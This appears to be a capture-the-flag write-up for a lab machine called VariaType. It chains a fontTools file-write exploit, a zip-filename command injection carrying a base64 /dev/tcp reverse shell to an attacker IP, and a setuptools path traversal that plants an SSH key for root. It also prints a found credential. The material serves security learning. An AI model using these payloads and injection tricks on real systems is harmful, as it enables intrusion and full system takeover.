@@ -1,0 +1,153 @@
+import { Bild, Code, Block, Marker } from "../components.tsx"
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+<br />
+
+Starting off with a <Code content="nmap" /> scan reveals two open ports:
+
+<Block language="Bash" content={"22 - SSH\n80 - HTTP"} />
+
+Browsing to port <Code content="80" /> reveals the VariaType website, a typography and variable font platform. The site offers a few pages including a tools section and a services section.
+
+<Bild
+    src="https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/variatype-website.png"
+    alt="VariaType website"
+    width="1920"
+    height="1466"
+/>
+
+The most interesting feature is the variable font generator under <Code content="/tools/variable-font-generator" />. It accepts a designspace file alongside one or more master fonts and generates a variable font from them.
+
+<br />
+
+I also used <Code content="ffuf" /> to check for hidden directories, but nothing interesting was found.
+
+<br />
+
+I found out that <Code content="fontTools" /> is used for the font generation. The underlying technology is vulnerable and I also found a public exploit for it <Marker content="CVE-2025-66034" link="https://github.com/symphony2colour/varlib-cve-2025-66034" />.
+
+<br />
+
+The vulnerability abuses the <Code content="filename" /> attribute inside the <Code content="variable-font" /> tag of a malicious designspace file to write an arbitrary file to the server's filesystem. Additionally the labelname attribute can be used to control the content of the files.
+
+<br />
+
+So the public exploit is straightforward: a malicious designspace file is crafted, additionally two master fonts are used to upload the payload to the webserver directory, then the file is triggered via a HTTP request to get a reverse shell.
+
+<br />
+
+Initially, the exploit is attempted as-is, targeting the webroot at <Code content="/var/www/variatype.htb/public" />. The exploit stated the file is uploaded successfully, but the trigger fails with a <Code content="404" />. This indicates that the file was not written to the expected location, so further enumeration is needed to find the correct webroot.
+
+<br />
+
+Virtual host enumeration reveals an additional subdomain:
+
+<Block
+    language="Bash"
+    content={
+        "ffuf -u http://variatype.htb -H 'Host: FUZZ.variatype.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+    }
+/>
+
+This uncovers <Code content="portal.variatype.htb" />. I suspected that the files are being written to the portal's webroot.
+
+<br />
+
+After adding it to the hostfile, the exploit is re-run with the trigger pointed at the portal subdomain. This time the shell triggers successfully and a reverse shell is caught.
+
+<Block
+    language="Bash"
+    content={
+        "python main.py \\\n\t--ip 10.10.15.250 \\\n\t--port 9999 \\\n\t--path /var/www/portal.variatype.htb/public \\\n\t--url http://variatype.htb/tools/variable-font-generator/process \\\n\t--trigger http://portal.variatype.htb"
+    }
+/>
+
+The shell is spawned under <Code content="www-data" /> under <Code content="/var/www/portal.variatype.htb/public" />. Also the shell is hella unstable, so it is upgraded:
+
+<Block language="Bash" content={"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm"} />
+
+Enumeration of the filesystem reveals credentials inside <Code content="auth.php" />:
+
+<Block language="Text" content={"gitbot : G1tB0t_Acc3ss_2025!"} />
+
+Logging into the portal at <Code content="portal.variatype.htb" /> with those credentials grants access to a dashboard that allows viewing and downloading uploaded font files.
+
+<Bild
+    src="https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/variatype-porta.png"
+    alt="VariaType portal"
+    width="1904"
+    height="1080"
+/>
+
+But I really didn't find anything interesting there.
+
+<br />
+
+Further enumeration of the filesystem reveals an interesting backup script at <Code content="/opt/process_client_submissions.bak" />. The script monitors the upload directory for font and archive files, validates their filenames against a strict regex, and processes them through <Code content="FontForge" /> before moving them to the home directory of <Code content="steve" />.
+
+<br />
+
+The script itself was vulnerable. The regex blocks most special characters, but zip archives can contain files with arbitrary names including shell metacharacters, because the zip format stores filenames as raw bytes in its header, bypassing filesystem restrictions entirely. This is <Marker content="CVE-2024-25081" link="https://nvd.nist.gov/vuln/detail/CVE-2024-25081" />.
+
+<br />
+
+A malicious zip is crafted with a filename that injects a base64-encoded reverse shell. Spaces are substituted with <Code content="${IFS}" /> since literal spaces are problematic in the injection context:
+
+<Block
+    language="Python"
+    content={
+        'import zipfile\n\npayload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNTAvOTk5OSAwPiYxCg=="\nexploit_filename = f"$(echo${{IFS}}{payload}|base64${{IFS}}-d|bash).ttf"\n\nwith zipfile.ZipFile(\'./exploit.zip\', \'w\') as zipf:\n    zipf.writestr(exploit_filename, "dummy content")'
+    }
+/>
+
+The zip is dropped into the upload directory directly via the existing shell. Looked like <Code content="steve" /> has a cronjob running, which processes the uploaded files. After a few seconds the script processes it and a shell is caught.
+
+<br />
+
+The user flag lies under <Code content="/home/steve/user.txt" />.
+
+<br />
+
+Checking sudo permissions immediately reveals the privilege escalation vector:
+
+<Block language="Bash" content={"(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *"} />
+
+The script downloads a font validator plugin from a given URL and installs it into <Code content="/opt/font-tools/validators/" /> using <Code content="setuptools.package_index.PackageIndex.download()" />. The installation runs as root.
+
+<br />
+
+The vulnerability here is <Marker content="CVE-2025-47273" link="https://nvd.nist.gov/vuln/detail/CVE-2025-47273" />. The <Code content="PackageIndex.download()" /> function derives the output filename from the URL and passes it to <Code content="os.path.join()" />. Python's <Code content="os.path.join()" /> has a well-known behavior: if the second argument is an absolute path beginning with <Code content="/" />, it discards the first argument entirely:
+
+<Block
+    language="Python"
+    content={
+        '# Returns only "/root/.ssh/authorized_keys"\nos.path.join("/opt/font-tools/validators", "/root/.ssh/authorized_keys")\n'
+    }
+/>
+
+By crafting a URL whose path component begins with a double slash, the filename derived by setuptools becomes an absolute path, causing the file to be written outside the intended directory.
+
+<br />
+
+An SSH keypair is generated and a small Flask server is set up to serve the public key:
+
+<Block
+    language="Python"
+    content={
+        "from flask import Flask, Response\n\napp = Flask(__name__)\npub = open(\"/tmp/root.pub\", \"r\").read().strip()\n\n@app.route('/', defaults={'path': ''})\n@app.route('/<path:path>')\ndef serve(path):\n    return Response(pub, mimetype='text/plain')\n\napp.run(host='0.0.0.0', port=8000)"
+    }
+/>
+
+The installer is then called with a URL pointing to the public key file, where the path begins with a double slash to trigger the traversal:
+
+<Block
+    language="Bash"
+    content={"sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.250:8000/%2Froot%2F.ssh%2Fauthorized_keys"}
+/>
+
+The public key is written to <Code content="/root/.ssh/authorized_keys" /> as root. SSH access is then possible using the corresponding private key:
+
+<Block language="Bash" content={"ssh -i /tmp/root.key root@variatype.htb"} />
+
+The root flag is retrieved from <Code content="/root/root.txt" />.
